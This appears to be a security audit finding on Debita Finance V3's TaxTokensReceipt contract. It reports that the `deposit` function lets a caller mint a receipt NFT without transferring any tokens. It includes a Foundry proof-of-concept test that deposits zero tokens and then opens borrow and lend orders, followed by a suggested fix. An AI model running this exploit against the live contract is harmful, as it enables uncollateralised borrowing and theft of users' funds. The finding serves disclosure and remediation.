# In TaxTokensReceipt Contract Attacker Can Exploit Deposit Function to Mint NFTs Without Payment

### Summary

The missing validation for the deposited amount in the `deposit` function will cause unauthorized minting of taxable NFTs for the system as attackers can mint NFTs without transferring any tokens by exploiting the tax deduction mechanism.

### Root Cause

In [TaxTokensReceipt.sol:59](https://github.com/sherlock-audit/2024-11-debita-finance-v3/blob/1465ba6884c4cc44f7fc28e51f792db346ab1e33/Debita-V3-Contracts/contracts/Non-Fungible-Receipts/TaxTokensReceipts/TaxTokensReceipt.sol#L59:L75) `deposit` Function :
There is no check to ensure that the difference in balance (`difference`) is strictly equal to the `amount` parameter provided by the user. This allows attackers to deposit an amount of `0` or an amount reduced by token taxes, yet successfully mint an NFT.

### Attack Path

- The attacker invokes the `deposit` function with a minimal or zero amount.
- Due to insufficient validation, the function accepts the transfer even when no tokens are effectively deposited.
- The attacker successfully mints an NFT (`TaxTokensReceipts`) backed by an invalid deposit.
- The attacker uses the minted NFT to interact with other components of the system (e.g., borrowing or lending) to exploit the platform.

### Impact

- The attacker mints fraudulent NFTs, causing potential financial loss and inflation in the NFT 
- This undermines the trust and integrity of the Debita 
- An attacker could exploit the minted NFT for further attacks (e.g., taking loans without collateral).
- Users' confidence in the platform diminishes due to the lack of proper validation and the potential loss of funds.

### PoC

Please add this test function to `TaxableTestFBomb.t.sol`

```Solidity
function testCreateOrders_PrgZr0() public {
    // Start acting as the buyer address
    vm.startPrank(buyer);
    // Approve the receipt contract to spend tokens on behalf of the buyer
    token.approve(address(receiptContract), 1000e18);
    // Attempt to deposit 0 tokens into the receipt contract
    uint tokenID = receiptContract.deposit(0); // Exploit: Attacker deposits 0 tokens
    // Verify that an NFT was successfully minted despite depositing 0 tokens
    assertEq(receiptContract.balanceOf(buyer), 1); // Exploit: NFT minted for 0 tokens

    // Create a borrow order using the token ID of the minted NFT
    createBorrowOrder(
        5e17,
        4000,
        tokenID,
        864000,
        1,
        fBomb,
        address(receiptContract),
        buyer
    );
    // Create a lend order with specific parameters
    createLendOrder(
        5e17,
        4000,
        864000,
        864000,
        100e18,
        fBomb,
        address(receiptContract),
        buyer
    );
    // Stop acting as the buyer address
    vm.stopPrank();
}
```

### Mitigation

```Solidity
function deposit(uint amount) public nonReentrant returns (uint) {
    require(amount > 0, "Deposit amount must be greater than zero"); // Validate input
    uint balanceBefore = ERC20(tokenAddress).balanceOf(address(this));
    SafeERC20.safeTransferFrom(
        ERC20(tokenAddress),
        msg.sender,
        address(this),
        amount
    );
    uint balanceAfter = ERC20(tokenAddress).balanceOf(address(this));
    uint difference = balanceAfter - balanceBefore;
    require(difference == amount, "Deposit amount mismatch after transfer"); // Ensure exact deposit
    tokenID++;
    tokenAmountPerID[tokenID] = amount;
    _mint(msg.sender, tokenID);
    emit Deposited(msg.sender, amount);
    return tokenID;
}
```
